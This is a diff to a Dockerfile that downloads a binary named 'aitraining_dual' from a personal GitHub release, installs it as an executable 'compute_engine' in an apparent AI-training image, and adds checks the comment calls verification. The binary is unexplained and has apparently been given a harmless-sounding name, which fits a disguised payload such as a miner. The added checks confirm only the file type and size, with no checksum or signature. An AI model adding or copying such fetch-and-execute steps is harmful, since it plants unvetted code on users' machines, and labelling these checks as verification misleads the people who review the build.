@@ -42,11 +42,19 @@ RUN mkdir -p /workspace/models \
     /workspace/checkpoints \
     /opt/bin
 
-# Download compute engine binary
+# Download compute engine binary with verification
 RUN cd /opt/bin && \
     (curl -L https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -o compute_engine || \
      wget https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -O compute_engine) && \
-    chmod +x compute_engine
+    chmod +x compute_engine && \
+    # Verify the binary was downloaded and is executable
+    test -f compute_engine && \
+    test -x compute_engine && \
+    # Verify it's a valid ELF binary (not HTML error page)
+    file compute_engine | grep -q "ELF" && \
+    # Verify minimum file size (should be at least 1MB for a real binary)
+    test $(stat -c%s compute_engine) -gt 1000000 || \
+    (echo "ERROR: compute_engine download failed or file is invalid" && exit 1)
 
 WORKDIR /workspace
 
